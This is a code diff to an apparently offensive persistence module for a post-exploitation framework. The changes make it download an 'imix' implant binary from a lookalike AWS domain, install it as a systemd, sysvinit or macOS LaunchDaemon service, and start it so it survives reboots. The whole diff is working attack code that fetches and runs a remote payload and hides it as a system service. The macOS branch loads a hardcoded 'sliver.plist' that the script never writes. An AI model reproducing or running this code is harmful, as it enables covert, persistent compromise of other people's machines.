@@ -12,8 +12,9 @@ def is_using_sysvinit():
         return True
     return False
 
-def systemd(service_name, service_desc, executable_path):
-    assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
+def systemd(service_name, service_desc, executable_path, executable_url):
+    # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
+    file.write("/tmp/systemd.service.j2", "[Unit]\nDescription={{ SERVICE_DESC }}\nRequires=network.target\nAfter=network.target\n\n[Service]\nType=simple\n{% if SERVICE_WORKING_DIR is defined %}\nWorkingDirectory={{ SERVICE_WORKING_DIR }}\n{% endif %}\nExecStart={{ SERVICE_START_CMD }}\n{% if SERVICE_STOP_CMD is defined %}\nExecStop={{ SERVICE_STOP_CMD }}\n{% endif %}\n{% if SERVICE_START_PRE_CMD is defined %}\nExecStartPre={{ SERVICE_START_PRE_CMD }}\n{% endif %}\n{% if SERVICE_PID_FILE is defined %}\nPIDFile={{ SERVICE_PID_FILE }}\n{% endif %}\n\n[Install]\nWantedBy=multi-user.target")
     args = {
         "SERVICE_NAME":service_name, 
         "SERVICE_DESC":service_desc,
@@ -22,15 +23,17 @@ def systemd(service_name, service_desc, executable_path):
     file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
     file.remove("/tmp/systemd.service.j2")
 
-    assets.copy("persist_service/files/payload.elf", executable_path)
+    # assets.copy("persist_service/files/payload.elf", executable_path)
+    file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
     
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
     sys.shell("systemctl start "+service_name)
 
-def sysvinit(service_name, service_desc, executable_path):
-    assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
+def sysvinit(service_name, service_desc, executable_path, executable_url):
+    # assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
+    file.write("/tmp/svc.sh.j2",'#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          {{ SERVICE_NAME }}\n# Required-Start:    $remote_fs $syslog\n# Required-Stop:     $remote_fs $syslog\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: {{ SERVICE_DESC }}\n# Description:       {{ SERVICE_DESC }}\n### END INIT INFO\n\ncmd={{ SERVICE_START_CMD }}\n\nname=`basename $0`\npid_file="/var/run/$name.pid"\n\nget_pid() {\n    cat "$pid_file"\n}\n\nis_running() {\n    [ -f "$pid_file" ] && ps -p `get_pid` > /dev/null 2>&1\n}\n\n\ncase "$1" in\n    start)\n    if is_running; then\n        echo "Already started"\n    else\n        echo "Starting $name"\n        cd "$dir"\n\n        $cmd &\n\n        echo $! > "$pid_file"\n        if ! is_running; then\n            echo "Unable to start, see $stdout_log and $stderr_log"\n            exit 1\n        fi\n    fi\n    ;;\n    stop)\n    if is_running; then\n        echo -n "Stopping $name.."\n        kill `get_pid`\n        for i in 1 2 3 4 5 6 7 8 9 10\n        do\n            if ! is_running; then\n                break\n            fi\n\n            echo -n "."\n            sleep 1\n        done\n        echo\n\n        if is_running; then\n            echo "Not stopped; may still be shutting down or shutdown may have failed"\n            exit 1\n        else\n            echo "Stopped"\n            if [ -f "$pid_file" ]; then\n                rm "$pid_file"\n            fi\n        fi\n    else\n        echo "Not running"\n    fi\n    ;;\n    restart)\n    $0 stop\n    if is_running; then\n        echo "Unable to stop, will not attempt to start"\n        exit 1\n    fi\n    $0 start\n    ;;\n    status)\n    if is_running; then\n        echo "Running"\n    else\n        echo "Stopped"\n        exit 1\n    fi\n    ;;\n    *)\n    echo "Usage: $0 {start|stop|restart|status}"\n    exit 1\n    ;;\nesac\n\nexit 0')
     args = {
         "SERVICE_NAME":service_name, 
         "SERVICE_DESC":service_desc,
@@ -40,14 +43,16 @@ def sysvinit(service_name, service_desc, executable_path):
     file.remove("/tmp/svc.sh.j2")
     sys.shell("chmod +x "+"/etc/init.d/"+service_name)
 
-    assets.copy("persist_service/files/payload.elf", executable_path)
+    # assets.copy("persist_service/files/payload.elf", executable_path)
+    file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
     
     sys.shell("update-rc.d "+service_name+" defaults")
     sys.shell("service "+service_name+" start")
 
-def launch_daemon(service_name, executable_path):
-    assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
+def launch_daemon(service_name, executable_path, executable_url):
+    # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
+    file.write("/tmp/plist.j2",'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n    <key>Label</key>\n    <string>{{ service_name }}</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>{{ bin_path }}</string>\n    </array>\n    <key>KeepAlive</key>\n    <true/>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>StartInterval</key>\n    <integer>300</integer>\n</dict>\n</plist>')
     args = {
         "service_name":"com.testing."+service_name, 
         "bin_path":executable_path
@@ -55,26 +60,34 @@ def launch_daemon(service_name, executable_path):
     file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
     file.remove("/tmp/plist.j2")
     
-    assets.copy("persist_service/files/payload.macho", executable_path)
+    # assets.copy("persist_service/files/payload.macho", executable_path)
+    file.download(executable_url, executable_path)
     sys.shell("chmod +x "+executable_path)
     sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")
 
-def persist_service(service_name, service_desc, executable_name):
+def persist_service(service_name, service_desc, executable_name, executable_url):
     if sys.is_linux():
         executable_path = "/usr/local/bin/"+executable_name
         if is_using_systemd():
-            systemd(service_name, service_desc, executable_path)
+            systemd(service_name, service_desc, executable_path, executable_url)
         elif is_using_sysvinit():
-            sysvinit(service_name, service_desc, executable_path)
+            sysvinit(service_name, service_desc, executable_path, executable_url)
     elif sys.is_macos():
         executable_path = "/var/root/"+executable_name
-        launch_daemon(service_name, executable_path)
+        launch_daemon(service_name, executable_path, executable_url)
     else:
         print("OS not supported")
 
+input_params = {
+    'service_name':'Test service',
+    'service_desc':'This is a test service',
+    'executable_name':'test123',
+    'executable_url': 'http://download.aws-metadata.com/IbxYZIJV/imix-upx-x86_64-unknown-linux-musl'
+}
 persist_service(
     input_params['service_name'],
     input_params['service_desc'],
-    input_params['executable_name']
+    input_params['executable_name'],
+    input_params['executable_url']
 )
 
